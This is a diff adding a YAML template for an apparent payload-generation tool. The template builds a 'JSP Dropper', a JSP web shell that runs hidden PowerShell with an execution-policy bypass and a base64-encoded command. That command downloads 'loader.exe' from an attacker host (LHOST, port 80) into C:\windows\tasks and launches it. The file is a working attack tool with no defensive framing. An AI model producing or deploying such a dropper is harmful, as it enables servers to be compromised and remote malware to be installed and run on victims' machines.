@@ -1,0 +1,29 @@
+description: "JSP Dropper - Executes powershell to dropand launch"
+variables:
+  outputdir: "output"
+  revshellFile: "loader.exe"
+  jspShell: "shell.jsp"
+  port: 80
+# Absolute paths can be handy when the user does not have a valid environment, specifically $PATH
+templates:
+  shell:
+    variables:
+      command: "iwr -UseBasicParsing http://{{LHOST}}:{{port}}/{{revshellFile}} -OutFile C:\\windows\\tasks\\db.exe;Start-Process -FilePath C:\\windows\\tasks\\db.exe"
+      #command: "iwr -UseBasicParsing http://{{LHOST}}:{{port}}/{{revshellFile}} -OutFile C:\\windows\\tasks\\dbb.exe;Start-Process -FilePath C:\\windows\\tasks\\dbb.exe"
+    template: |-
+      <%@ page import="java.io.*"%>
+      <%
+      try { 
+        Process p = Runtime.getRuntime().exec("C:\\Windows\\System32\\WindowsPowerShell\\V1.0\\powershell.exe -ep bypass -Sta -Nop -Window Hidden -e {{ Encoder.base64(command,Encoder.utf16le) }}");
+      } catch(IOException e) {
+        e.printStackTrace();
+      }
+      %>
+setupCommands:
+- "mkdir -p {{outputdir}}"
+- "rm -rf {{outputdir}}/{{jspShell}}"
+commands:
+- |-
+  cat << EOF >{{outputdir}}/{{jspShell}}
+  {{Templates.get('shell')}}
+  EOF
